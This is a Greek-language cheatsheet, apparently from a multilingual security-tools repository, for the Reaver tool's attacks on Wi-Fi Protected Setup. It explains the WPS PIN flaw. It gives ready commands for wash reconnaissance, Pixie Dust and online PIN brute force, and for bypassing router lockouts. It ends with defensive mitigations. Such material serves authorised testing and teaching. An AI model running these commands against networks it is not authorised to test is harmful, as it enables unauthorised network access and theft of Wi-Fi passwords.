<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Reaver Cheatsheet

Το [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) είναι ένα εξειδικευμένο εργαλείο ελέγχου ασφάλειας Wi-Fi που έχει σχεδιαστεί για να εκτελεί επιθέσεις ωμής βίας κατά των PIN καταχώρισης Wi-Fi Protected Setup (WPS). Με την ανάκτηση του 8ψήφιου PIN WPS, ο Reaver ανακτά το προ-κοινόχρηστο κλειδί απλού κειμένου WPA/WPA2 (PSK). Υποστηρίζει επίσης επιθέσεις εκτός σύνδεσης Pixie Dust μέσω `pixiewps`.

---

## Πίνακας περιεχομένων

- [WPS Vulnerability Mechanics](#wps-vulnerability-mechanics)
- [Εγκατάσταση (`reaver` & `pixiewps`)](#installation-reaver--pixiewps)
- [Reconnaissance: Identifying WPS Networks (`wash`)](#reconnaissance-identifying-wps-networks-wash)
- [Pixie Dust Attack (Instant Key Recovery)] (#pixie-dust-attack-instant-key-recovery)
- [Full Online PIN WPS Brute-Force](#full-online-wps-pin-brute-force)
- [Περιορισμός ποσοστού AP & Χειρισμός κλειδώματος] (#ap-rate-limiting--lockout-handling)
- [Αμυντικός μετριασμός](#defensive-mitigation)

---

## Μηχανική ευπάθειας WPS

Ο έλεγχος ταυτότητας PIN WPS χρησιμοποιεί ένα 8-ψήφιο PIN χωρισμένο σε δύο μισά:
- Το πρώτο εξάμηνο είναι 4 ψηφία ($10^4 = 10.000$ δυνατότητες).
- Το δεύτερο μισό είναι 3 ψηφία + 1 ψηφίο αθροίσματος ελέγχου ($10^3 = 1.000$ δυνατότητες).
- Αντί να δοκιμάσει συνδυασμούς 10^8 $ = 100.000.000 $, ένας εισβολέας δοκιμάζει μόνο προσπάθειες 10.000 $ + 1.000 = 11.000 $.
- **Pixie Dust Attack:** Εκμεταλλεύεται αδύναμο PRNG (Pseudo-Random Number Generators) σε συγκεκριμένα ασύρματα chipsets (Ralink, MediaTek, Realtek, Broadcom) για να υπολογίσει το PIN WPS εκτός σύνδεσης σε δευτερόλεπτα από μόλις 2 αρχικά πακέτα.

---

## Εγκατάσταση (`reaver` & `pixiewps`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Verify command
reaver -h
```
---

## Αναγνώριση: Αναγνώριση δικτύων WPS (`wash`)

Πριν ξεκινήσετε το Reaver, βρείτε σημεία πρόσβασης με ενεργοποιημένο το WPS και ελέγξτε εάν είναι κλειδωμένα:
```bash
# Put wireless interface into monitor mode
sudo airmon-ng start wlan0
# or:
sudo iw dev wlan0 set type monitor

# Scan for WPS-enabled routers using wash
sudo wash -i wlan0mon
```
Βασικές στήλες που πρέπει να παρατηρήσετε:
- **`WPS Locked`**: Εάν `Yes`, ο δρομολογητής έχει κλειδώσει τις προσπάθειες PIN WPS λόγω προηγούμενης δραστηριότητας ωμής βίας. Στοχεύστε δρομολογητές που εμφανίζουν `No`.
- **`WPS Ver`**: Έκδοση WPS (1.0 ή 2.0).
- **`ESSID` & `BSSID`**: Όνομα δικτύου στόχευσης και MAC.

---

## Pixie Dust Attack (Άμεση ανάκτηση κλειδιού)

Η επίθεση Pixie Dust (`-K 1`) είναι η ταχύτερη επίθεση ενάντια στο WPS. Συλλέγει τα E-Hash1, E-Hash2 και nonces από το δρομολογητή και σπάει το PIN εκτός σύνδεσης χωρίς να ενεργοποιεί όρια ρυθμού:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon`: Διασύνδεση λειτουργίας παρακολούθησης.
- `-b <bssid>`: Στόχος δρομολογητής MAC.
- `-c 6`: Κανάλι του στόχου AP.
- `-K 1`: Εκτελέστε αυτόματη επίθεση Pixie Dust μέσω `pixiewps`.
- `-vv`: Λεπτή έξοδος.

*Εάν είναι ευάλωτα, το PIN και το WPA PSK εκτυπώνονται σε λιγότερο από 10 δευτερόλεπτα.*

---

## Πλήρες Online PIN WPS Brute-Force

Εάν το Pixie Dust αποτύχει, επιστρέψτε στο διαδικτυακό brute-forcing:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```
Μόλις εντοπιστεί το PIN, το Reaver βγάζει:
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecretWiFiPassword'
[+] AP SSID: 'Target_Network'
```
---

## AP Rate Limiting & Lockout Handling

Πολλοί σύγχρονοι δρομολογητές κλειδώνουν τις προσπάθειες WPS για 5-15 λεπτά μετά από 3-5 αποτυχημένες προσπάθειες. Χρησιμοποιήστε σημαίες καθυστέρησης και δοκιμάστε ξανά τον συντονισμό:
```bash
# Delay 10 seconds between attempts
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Wait 300 seconds if the router locks WPS
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Ignore NACK packets and keep trying
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```
### Εναλλακτική: Χρήση `bully`
Το `bully` είναι μια γρήγορη εφαρμογή C της επίθεσης WPS που χειρίζεται καλά τις εφαρμογές περίεργων δρομολογητών:
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```
---

## Αμυντικός μετριασμός

- **Απενεργοποιήστε πλήρως το WPS:** Η πιο ασφαλής πρόταση είναι να απενεργοποιήσετε το WPS στη διεπαφή ιστού του δρομολογητή.
- **Ενημέρωση υλικολογισμικού:** Οι σύγχρονοι δρομολογητές εφαρμόζουν αυστηρό περιορισμό ρυθμού, εκθετική υποχώρηση και διορθώνουν ελαττώματα εντροπίας PRNG που εκμεταλλεύεται η Pixie Dust.
- **Χρήση WPA3:** Το WPA3 καταργεί πλήρως το WPS που βασίζεται σε PIN παλαιού τύπου, αντικαθιστώντας το με ασφαλή Wi-Fi Easy Connect (DPP).